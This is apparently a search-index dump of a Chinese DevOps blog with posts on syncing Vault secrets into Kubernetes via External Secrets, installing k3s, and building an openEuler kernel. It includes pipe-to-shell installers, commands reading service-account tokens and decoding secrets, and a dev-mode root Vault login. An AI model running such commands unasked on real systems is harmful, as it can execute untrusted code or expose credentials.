可以使用kubernetes的认证方式来进行vault-role角色的身份认证\n# 进入容器 kubectl exec -it vault-0 -- /bin/sh # 登录，要输入的token可以从日志里看到 vault login root # 开启kubernetes认证方式 vault auth enable kubernetes # 每个pod里面都有sa，k8s会将这个sa的token注入到文件/var/run/secrets/kubernetes.io/serviceaccount/token # 那就用这个sa的token，调用k8s token_reviewer进行身份认证 # 认证通过vault就会颁发一个对应vault-role的vault-token令牌出来 # 用vault-token就可以去vault里读取到vault-secret的内容了 vault write auth/kubernetes/config \\ token_reviewer_jwt=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\u0026#34; \\ kubernetes_host=\u0026#34;https://kubernetes.default.svc:443\u0026#34; \\ kubernetes_ca_cert=@/var/run/secrets/kubernetes.io/serviceaccount/ca.crt # 拿token的另一种方法： # kubectl get secret $(kubectl get serviceaccount external-secrets-sa -o jsonpath=\u0026#34;{.secrets[0].name}\u0026#34;) -o jsonpath=\u0026#34;{.data.token}\u0026#34; | base64 --decode # vault的认证体系跟AWS一样 # 先建policy，后建role # 所以先建一个读secret的策略 vault policy write external-secrets-policy - \u0026lt;\u0026lt;EOF path \u0026#34;secret/data/*\u0026#34; { capabilities = [\u0026#34;read\u0026#34;, \u0026#34;list\u0026#34;] } EOF # 然后建立一个vault的role，将这个vault-role绑定到k8s的sa账号上 # 那k8s token review认证通过就可以获得相应vault-role的权限 vault write auth/kubernetes/role/external-secrets-operator \\ bound_service_account_names=external-secrets-sa \\ bound_service_account_namespaces=external-secrets \\ policies=external-secrets-policy \\ ttl=24h # 放数据进去vault vault kv put secret/my-app MY_SECRET_NAME=\u0026#34;Fuck Dingdang\u0026#34; vault kv get secret/my-app 四、external-secret同步的设定 external-secret相当于中间人，他有很多自定义的资源，来自动进行vault-secret和k8s-secret之间的同步\nClusterSecretStore指定了vault server、vault-role、k8s sa的关系\n--- apiVersion: external-secrets.io/v1 kind: ClusterSecretStore metadata: name: vault-cluster-secretstore spec: provider: vault: server: \u0026#34;http://vault.default.svc.cluster.local:8200\u0026#34; # 请根据你的vault服务地址调整 path: \u0026#34;secret\u0026#34; # KV引擎挂载路径，与你vault kv put命令中路径对应 version: \u0026#34;v2\u0026#34; # KV版本为v2 auth: kubernetes: mountPath: \u0026#34;kubernetes\u0026#34; # 你启用的k8s auth路径 role: \u0026#34;external-secrets-operator\u0026#34; # 你在vault中创建的role名称 serviceAccountRef: name: external-secrets-sa # 你为ESO创建的ServiceAccount名称 namespace: external-secrets # ServiceAccount所在命名空间 ExternalSecret 指定了利用vault-role获得了vault-secret，放置到最终要用到的k8s-secret中\n注意有刷新，每小时会刷新一次的\n--- apiVersion: external-secrets.io/v1 kind: ExternalSecret metadata: name: demo-external-secret namespace: default spec: refreshInterval: 1h secretStoreRef: name: vault-cluster-secretstore kind: ClusterSecretStore target: name: demo-secret creationPolicy: Owner data: - secretKey: MY_SECRET_NAME remoteRef: key: my-app property: MY_SECRET_NAME # Vault中具体的键名 通过以上两个资源，那vault里存放的secret就被同步到k8s的secret中了\n五、实际部署一个应用看看 那我们随便起个deployment\n--- apiVersion: apps/v1 kind: Deployment metadata: name: demo-deployment namespace: default # 使用目标命名空间，可以修改为你的实际命名空间 labels: app: demo spec: replicas: 1 # 副本数量，可以根据需要调整 selector: matchLabels: app: my-app template: metadata: labels: app: my-app spec: containers: - name: demo-container image: nginx:latest imagePullPolicy: IfNotPresent # 如果本地已经存在镜像则不拉取 ports: - containerPort: 8080 # 容器暴露的端口 env: - name: MY_SECRET_NAME valueFrom: secretKeyRef: name: demo-secret # 引用的 Secret 名称 key: MY_SECRET_NAME # Secret 中的键名 --- apiVersion: v1 kind: Secret metadata: name: demo-secret namespace: default # 使用目标命名空间，可以修改为你的实际命名空间 type: Opaque data: MY_SECRET_NAME: AABBCC 实在太复杂痛苦了，最终的环境变量应该如下：\nMY_SECRET_NAME=\u0026#34;Fuck Dingdang\u0026#34; 但这没有结束呢。\n六、安装配置reloader自动轮换 如果secret被改了，如AK的Secret自动轮换了，那pod也必须跟着自动重启以加载新的变量\n# 安装reloader kubectl apply -f https://raw.githubusercontent.com/stakater/Reloader/master/deployments/kubernetes/reloader.yaml 在deploy中container的部分新增annotations:\nmetadata: annotations: reloader.stakater.com/auto: \u0026#34;true\u0026#34; 如下：\n--- apiVersion: apps/v1 kind: Deployment metadata: name: demo-deployment namespace: default annotations: reloader.stakater.com/auto: \u0026#34;true\u0026#34; labels: app: demo spec: replicas: 1 # 副本数量，可以根据需要调整 selector: matchLabels: app: my-app template: metadata: labels: app: my-app spec: containers: - name: demo-container image: nginx:latest imagePullPolicy: IfNotPresent # 如果本地已经存在镜像则不拉取 ports: - containerPort: 80 env: - name: MY_SECRET_NAME valueFrom: secretKeyRef: name: demo-secret # 引用的 Secret 名称 key: MY_SECRET_NAME # Secret 中的键名 这样ENV环境变量改变的时候就可以自动重起pod\n七、另一种注入式的做法vault injector Deployment新增annotations:\nmetadata: annotations: vault.hashicorp.com/agent-inject: \u0026#34;true\u0026#34; vault.hashicorp.com/role: \u0026#34;demo-role\u0026#34; vault.hashicorp.com/agent-inject-secret-MY_SECRET_NAME: \u0026#34;secret/data/demo\u0026#34; vault.hashicorp.com/agent-inject-template-MY_SECRET_NAME: | {{- with secret \u0026#34;secret/data/demo\u0026#34; -}} export MY_SECRET_NAME=\u0026#34;{{ .Data.data.MY_SECRET_NAME }}\u0026#34; {{- end -}} 完整如下：\n--- apiVersion: apps/v1 kind: Deployment metadata: name: demo-deployment namespace: default annotations: vault.hashicorp.com/agent-inject: \u0026#34;true\u0026#34; vault.hashicorp.com/role: \u0026#34;demo-role\u0026#34; vault.hashicorp.com/agent-inject-secret-MY_SECRET_NAME: \u0026#34;secret/data/demo\u0026#34; vault.hashicorp.com/agent-inject-template-MY_SECRET_NAME: | {{- with secret \u0026#34;secret/data/demo\u0026#34; -}} export MY_SECRET_NAME=\u0026#34;{{ .Data.data.MY_SECRET_NAME }}\u0026#34; {{- end }} spec: replicas: 1 selector: matchLabels: app: my-app template: metadata: labels: app: my-app annotations: vault.hashicorp.com/agent-inject: \u0026#34;true\u0026#34; vault.hashicorp.com/role: \u0026#34;demo-role\u0026#34; vault.hashicorp.com/agent-inject-secret-MY_SECRET_NAME: \u0026#34;secret/data/demo\u0026#34; vault.hashicorp.com/agent-inject-template-MY_SECRET_NAME: | {{- with secret \u0026#34;secret/data/demo\u0026#34; -}} export MY_SECRET_NAME=\u0026#34;{{ .Data.data.MY_SECRET_NAME }}\u0026#34; {{- end }} spec: serviceAccountName: demo-sa containers: - name: demo-container image: nginx:latest imagePullPolicy: IfNotPresent ports: - containerPort: 80 如上也可以做到secret有改动，就自动重启\n八、补全一下用k8s Token凭据验证vault角色的过程 # 先建立一个SA apiVersion: v1 kind: ServiceAccount metadata: name: demo-sa namespace: default # 然后定义一个Deployment，在spec附上这个SA --- apiVersion: apps/v1 kind: Deployment metadata: labels: app: nginx name: nginx namespace: default spec: serviceAccountName: demo-sa replicas: 1 selector: matchLabels: app: nginx template: metadata: labels: app: nginx spec: containers: - env: - name: VAULT_ADDR value: \u0026#34;http://vault.default.svc.cluster.local:8200\u0026#34; # 替换为 Vault 的服务地址 image: nginx:latest imagePullPolicy: IfNotPresent name: nginx # 登录vault服务（开发模式，登录用户是root） vault login root # 启用 Kubernetes Auth 模式 vault auth enable kubernetes # vault 使用 sa Token进行身份识别 vault write auth/kubernetes/config \\ token_reviewer_jwt=\u0026#34;$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\u0026#34; \\ kubernetes_host=\u0026#34;https://kubernetes.default.svc:443\u0026#34; \\ kubernetes_ca_cert=@/var/run/secrets/kubernetes.io/serviceaccount/ca.crt # 创建一个policy vault policy write demo-policy - \u0026lt;\u0026lt;EOF path \u0026#34;secret/data/*\u0026#34; { capabilities = [\u0026#34;read\u0026#34;, \u0026#34;list\u0026#34;] } EOF # 创建一个vault-role，绑定到sa vault write auth/kubernetes/role/demo-role \\ bound_service_account_names=demo-sa \\ bound_service_account_namespaces=default \\ policies=demo-policy \\ # 存放测试kv数据 vault kv put secret/demo MY_SECRET_NAME=\u0026#34;BBCCDDEE\u0026#34; vault kv get secret/demo # 启动一个deployment --- apiVersion: apps/v1 kind: Deployment metadata: labels: app: nginx name: nginx namespace: default spec: serviceAccountName: demo-sa replicas: 1 selector: matchLabels: app: nginx template: metadata: labels: app: nginx spec: containers: - env: - name: VAULT_ADDR value: \u0026#34;http://vault.default.svc.cluster.local:8200\u0026#34; # 替换为 Vault 的服务地址 image: nginx:latest imagePullPolicy: IfNotPresent name: nginx # 进入deployment的pod中 kubectl exec -it nginx -- /bin/sh # 拿到本地sa的Token export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) # 注意pod里有环境变量VAULT_ADDR，如果没有要定义一下 # 然后用curl拿vault-token curl -X POST \u0026#34;${VAULT_ADDR}/v1/auth/kubernetes/login\u0026#34; \\ -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{ \u0026#34;role\u0026#34;: \u0026#34;demo-role\u0026#34;, \u0026#34;jwt\u0026#34;: \u0026#34;\u0026#39;$TOKEN\u0026#39;\u0026#34; }\u0026#39; # curl 返回字符串中的 client_token 字段 export VAULT_TOKEN=\u0026#34;hvs.CAESaaaBBBcccDDDEEEfffGGG\u0026#34; # 用vault_token获得kv的数据 curl -X GET \u0026#34;${VAULT_ADDR}/v1/secret/data/demo\u0026#34; -H \u0026#34;X-Vault-Token: $VAULT_TOKEN\u0026#34; 所以，其实vault有api接口，可以直接调用curl来认证并获取数据，这就极大的扩展了vault的接口范围。\n好了，就到这里吧！\n","permalink":"https://rendoumi.com/posts/20250815-vault_k8s/","summary":"\u003ch3 id=\"今天是2025年8月15日大噩耗啊\"\u003e今天是2025年8月15日，大噩耗啊：\u003c/h3\u003e\n\u003ch2 id=\"external-secrets--external-secrets\"\u003eexternal-secrets / external-secrets\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/external-secrets/external-secrets\"\u003eLink\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e⭐ 5416 | 🔀 1032 | Go 97.6%\u003c/p\u003e\n\u003ch3 id=\"external-secrets-operator-项目暂停发布\"\u003eExternal Secrets Operator 项目暂停发布\u003c/h3\u003e\n\u003cp\u003e由于维护团队规模过小，External Secrets Operator 决定暂停所有官方版本发布，直到重建足够的维护团队。\u003c/p\u003e\n\u003ch4 id=\"key-takeaways\"\u003eKey Takeaways\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003e项目暂停所有官方版本发布，包括新功能、补丁和容器镜像。\u003c/li\u003e\n\u003cli\u003e将继续审核和合并社区的 PR，但不会提供 GitHub Discussions、Slack 或问题评论的支持。\u003c/li\u003e\n\u003cli\u003e需要至少五名长期维护者来确保项目的可持续发展。\u003c/li\u003e\n\u003cli\u003e鼓励依赖该项目的公司或团队积极参与贡献。\u003c/li\u003e\n\u003cli\u003e贡献者可通过填写表单或查看治理文档加入项目。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e居然暂停发布了，那就抓紧时间把Vault跟它的集成记录下来：\u003c/p\u003e\n\u003ch3 id=\"一首先必须在集群里安装vault然后安装external--secrets都用helm装即可\"\u003e一、首先必须在集群里安装Vault，然后安装external -secrets，都用helm装即可\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehelm repo add hashicorp https://helm.releases.hashicorp.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehelm repo update\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehelm install vault hashicorp/vault --set \u003cspan class=\"s2\"\u003e\u0026#34;server.dev.enabled=true\u0026#34;\u003c/span\u003e --set \u003cspan class=\"s2\"\u003e\u0026#34;injector.enabled=true\u0026#34;\u003c/span\u003e --namespace default\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehelm repo add external-secrets https://charts.external-secrets.io\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehelm repo update\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehelm install external-secrets external-secrets/external-secrets --namespace external-secrets --create-namespace --set \u003cspan class=\"nv\"\u003einstallCRDs\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"二k8s授权k8的授权体系就是-sa---role---rolebinding\"\u003e二、k8s授权，k8的授权体系就是 sa -\u0026gt; role -\u0026gt; rolebinding\u003c/h3\u003e\n\u003cp\u003e那kubernetes会把pod中sa的Token注入到文件：\u003ccode\u003e/var/run/secrets/kubernetes.io/serviceaccount/token\u003c/code\u003e\u003c/p\u003e","title":"vault使用external secret管理kubernetes secret"},{"content":"这篇是一个大水贴，只是为了记录k3s的安装\n这个东西被Rancher用得纯熟，先搭建一个k3s集群，然后再其上装控制软件，再去控制其它集群，非常好的想法，值得借鉴\n安装和删除都非常简洁，准备工作：\napt update \u0026amp;\u0026amp; apt upgrade -y # 三台机器分别设置 hostnamectl set-hostname master hostnamectl set-hostname worker-1 hostnamectl set-hostname worker-2 # vi /etc/hosts 127.0.0.1 master # 两外两台也分别设置 127.0.0.1 worker-1 # 第3台 127.0.0.1 worker-2 准备工作都弄好了。下面安装\ncurl -sfL https://get.k3s.io | sh - systemctl status k3s cat /var/lib/rancher/k3s/server/node-token # 加入新节点 curl -sfL https://get.k3s.io | K3S_URL=https://192.168.0.200:6443 K3S_TOKEN=\u0026lt;your-token-here\u0026gt; INSTALL_K3S_EXEC=\u0026#34;--node-ip=\u0026lt;worker-ip\u0026gt;\u0026#34; sh - 删除也就一句\n/usr/local/bin/k3s-uninstall.sh 可以反复进行安装\n","permalink":"https://rendoumi.com/posts/20250808-k3s_install/","summary":"\u003cp\u003e这篇是一个大水贴，只是为了记录k3s的安装\u003c/p\u003e\n\u003cp\u003e这个东西被Rancher用得纯熟，先搭建一个k3s集群，然后再其上装控制软件，再去控制其它集群，非常好的想法，值得借鉴\u003c/p\u003e\n\u003cp\u003e安装和删除都非常简洁，准备工作：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt update \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e apt upgrade -y\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 三台机器分别设置\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehostnamectl set-hostname master\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehostnamectl set-hostname worker-1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehostnamectl set-hostname worker-2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# vi /etc/hosts\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e127.0.0.1 master\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 两外两台也分别设置\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e127.0.0.1 worker-1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 第3台\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e127.0.0.1 worker-2\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e准备工作都弄好了。下面安装\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecurl -sfL https://get.k3s.io \u003cspan class=\"p\"\u003e|\u003c/span\u003e sh -\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl status k3s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /var/lib/rancher/k3s/server/node-token\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 加入新节点\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecurl -sfL https://get.k3s.io \u003cspan class=\"p\"\u003e|\u003c/span\u003e \u003cspan class=\"nv\"\u003eK3S_URL\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ehttps://192.168.0.200:6443 \u003cspan class=\"nv\"\u003eK3S_TOKEN\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026lt;your-token-here\u0026gt; \u003cspan class=\"nv\"\u003eINSTALL_K3S_EXEC\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;--node-ip=\u0026lt;worker-ip\u0026gt;\u0026#34;\u003c/span\u003e sh -\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e删除也就一句\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/usr/local/bin/k3s-uninstall.sh\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e可以反复进行安装\u003c/p\u003e","title":"k3s的安装"},{"content":"欧拉 Page Cache 的内核编译 PageCache提供了一种限制page cache的能力，能够对page cache的总量进行控制, 增强系统在数据库等page cache占比较高场景下的稳定性，积极释放缓存。\n它提供了以下sysctl接口：\nvm.pagecache_limit_ratio：pagecache占系统总内存的百分比，[0, 100]，0和100都表示功能关闭。 vm.pagecache_limit_reclaim_ratio：针对pagecache真实回收的比例，在实际回收时，总是比pagecache_limit_ratio的多回收一些，默认比例是2%。 vm.pagecache_limit_ignore_dirty：在回收时是否忽略脏页，默认忽略。因为对脏页的回收较耗时。 补丁是基于 openEuler-22.03-LTS 的，不适用于 24.03-LTS，代码都已不同了\n编译过程如下：\n一、安装好openEuler-22.03-LTS，磁盘留够空间，最少留20G\n二、安装编译已经所需软件\ndnf install -y rpm-build openssl-devel bc rsync gcc gcc-c++ flex bison m4 elfutils-libelf-devel dnf install -y python dnf install -y ncurses-devel dnf install -y dwarves 三、安装内核源代码\ndnf install -y kernel-source 现在是2024年11月4日，内核版本是 linux-5.10.0-60.139.0.166.oe2203.x86_64，注意补丁的适用范围\n四、打补丁\npage.patch\n将page.patch 放到 /usr/src\ncd /usr/src/linux-5.10.0-60.139.0.166.oe2203.x86_64 patch -p1 \u0026lt; ../page.patch 五、编辑内核版本号，EXTRAVERSION的版本号要大于当前内核版本，否则无法安装。当前是166，改成+1，167\ncd /usr/src/linux-5.10.0-60.139.0.166.oe2203.x86_64 vi Makefile # SPDX-License-Identifier: GPL-2.0 VERSION = 5 PATCHLEVEL = 10 SUBLEVEL = 0 EXTRAVERSION = -60.139.0.167.oe2203.x86_64 NAME = Kleptomaniac Octopus OPENEULER_MAJOR = 2203 OPENEULER_MINOR = 0 六、编译\ncd /usr/src/linux-5.10.0-60.139.0.166.oe2203.x86_64 make openeuler_defconfig #根据cpu的核数来调整-j后面的参数 make binrpm-pkg -j8 #报两个错，ignore mm/vmscan.c:4306:22: warning: ‘global_reclaimable_pages’ defined but not used [-Wunused-function] 4306 | static unsigned long global_reclaimable_pages(void) | ^~~~~~~~~~~~~~~~~~~~~~~~ kernel/sysctl.c: In function ‘pc_reclaim_limit_proc_dointvec’: kernel/sysctl.c:715:2: warning: ISO C90 forbids mixed declarations and code [-Wdeclaration-after-statement] 715 | int pre_reclaim_ratio = vm_pagecache_limit_reclaim_ratio; | ^~~ #生成的包放在如下目录下 /root/rpmbuild 七、安装编译好的内核\nrpm -ivh /root/rpmbuild/RPMS/x86_64/kernel-headers-5.10.0_60.139.0.167.oe2203.x86_64-1.x86_64.rpm 八、修改启动项\ncat /boot/grub2/grub.cfg | grep -E \u0026#34;menuentry \u0026#39;\u0026#34; grub2-set-default 0 九、查看新内核\nuname -a Linux localhost.localdomain 5.10.0-60.139.0.167.oe2203.x86_64 #1 SMP Mon Nov 4 15:49:50 CST 2024 x86_64 x86_64 x86_64 GNU/Linux ","permalink":"https://rendoumi.com/posts/20250808-openeuler_pagecache/","summary":"\u003ch1 id=\"欧拉-page-cache-的内核编译\"\u003e欧拉 Page Cache 的内核编译\u003c/h1\u003e\n\u003cp\u003ePageCache提供了一种限制page cache的能力，能够对page cache的总量进行控制, 增强系统在数据库等page cache占比较高场景下的稳定性，积极释放缓存。\u003c/p\u003e\n\u003cp\u003e它提供了以下sysctl接口：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003evm.pagecache_limit_ratio：pagecache占系统总内存的百分比，[0, 100]，0和100都表示功能关闭。\u003c/li\u003e\n\u003cli\u003evm.pagecache_limit_reclaim_ratio：针对pagecache真实回收的比例，在实际回收时，总是比pagecache_limit_ratio的多回收一些，默认比例是2%。\u003c/li\u003e\n\u003cli\u003evm.pagecache_limit_ignore_dirty：在回收时是否忽略脏页，默认忽略。因为对脏页的回收较耗时。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e补丁是基于 openEuler-22.03-LTS 的，不适用于 24.03-LTS，代码都已不同了\u003c/p\u003e\n\u003cp\u003e编译过程如下：\u003c/p\u003e\n\u003cp\u003e一、安装好openEuler-22.03-LTS，磁盘留够空间，最少留20G\u003c/p\u003e\n\u003cp\u003e二、安装编译已经所需软件\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ednf install -y rpm-build openssl-devel bc rsync gcc gcc-c++ flex bison m4 elfutils-libelf-devel\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ednf install -y python\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ednf install -y ncurses-devel\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ednf install -y dwarves\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e三、安装内核源代码\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ednf install -y kernel-source\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e现在是2024年11月4日，内核版本是 linux-5.10.0-60.139.0.166.oe2203.x86_64，注意补丁的适用范围\u003c/p\u003e\n\u003cp\u003e四、打补丁\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"page.patch\"\u003epage.patch\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e将page.patch 放到 /usr/src\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /usr/src/linux-5.10.0-60.139.0.166.oe2203.x86_64\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epatch -p1 \u0026lt; ../page.patch\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e五、编辑内核版本号，EXTRAVERSION的版本号要大于当前内核版本，否则无法安装。当前是166，改成+1，167\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /usr/src/linux-5.10.0-60.139.0.166.oe2203.x86_64\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi Makefile\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# SPDX-License-Identifier: GPL-2.0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eVERSION\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ePATCHLEVEL\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eSUBLEVEL\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eEXTRAVERSION\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e -60.139.0.167.oe2203.x86_64\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eNAME\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e Kleptomaniac Octopus\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eOPENEULER_MAJOR\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e2203\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eOPENEULER_MINOR\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e六、编译\u003c/p\u003e","title":"欧拉PageCache的内核编译"},{"content":"极客天成有个很厉害的scaleflash网络文件系统，充分利用rdma的无损网络特性，并进一步发扬光大。研发出来了可以顶替EMC盘阵的存储系统，可以在其上跑Oracle等数据库系统，真的是国货之光了。\n帮它们改写了一个csi的存储插件，记录一下，基于yandex的s3 